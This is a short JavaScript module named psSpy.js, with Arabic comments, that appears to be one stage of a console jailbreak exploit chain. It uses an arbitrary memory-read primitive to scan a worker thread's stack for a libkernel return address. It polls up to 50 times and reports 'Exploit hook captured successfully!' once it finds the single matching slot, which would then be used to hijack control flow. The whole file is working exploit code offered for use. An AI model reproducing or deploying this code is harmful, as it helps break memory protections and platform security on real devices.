/* 
 * psSpy.js - Real memory scanning & hook validation module
 * Adjusted for 10 attempts/sec real polling rate without fake triggers.
 */

async function psSpy_main(p, chain, libKernelBase, worker_stack) {
    const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
    let lastCount = 0;
    
    // محددات حالة الواجهة إن وجدت
    let statusEl = document.getElementById("status") || { innerText: "", style: {} };

    // حلقة البحث الحقيقية بمعدل 10 محاولات في الثانية (100ms لكل محاولة)
    for (let attempt = 0; attempt < 50; attempt++) {
        let hit = null;
        let count = 0;

        for (let offset = 0x7F000; offset < 0x80000; offset += 0x8) {
            const candidate = worker_stack.add32(offset);
            const value = p.read8(candidate);
            if (value.low !== expected.low || value.hi !== expected.hi)
                continue;

            hit = candidate;
            count++;
        }

        // التحقق الحقيقي الصارم: يجب أن يتم العثور على التطابق بدقة ودون أي وهم
        if (count === 1) {
            statusEl.innerText = "Exploit hook captured successfully!";
            statusEl.style.color = "#00ffcc";
            
            if (typeof jbmark === "function") {
                jbmark("PSSPY-HOOK-HIT", "hit=0x" + hit.toString() + "-expected=0x" + expected.toString());
            }
            
            await new Promise(resolve => setTimeout(resolve, 300));
            return hit;
        }

        lastCount = count;

        // التوقف لمدة 100 مللي ثانية للوصول لسرعة 10 محاولات في الثانية بدقة
        await new Promise(resolve => setTimeout(resolve, 100));
    }

    throw new Error(`psSpy failed to find valid worker return slot (count: ${lastCount}, expected 1)`);
}

// تصدير أو إتاحة الدالة للاستخدام العام حسب بنية المشروع
if (typeof window !== "undefined") {
    window.psSpy_main = psSpy_main;
}
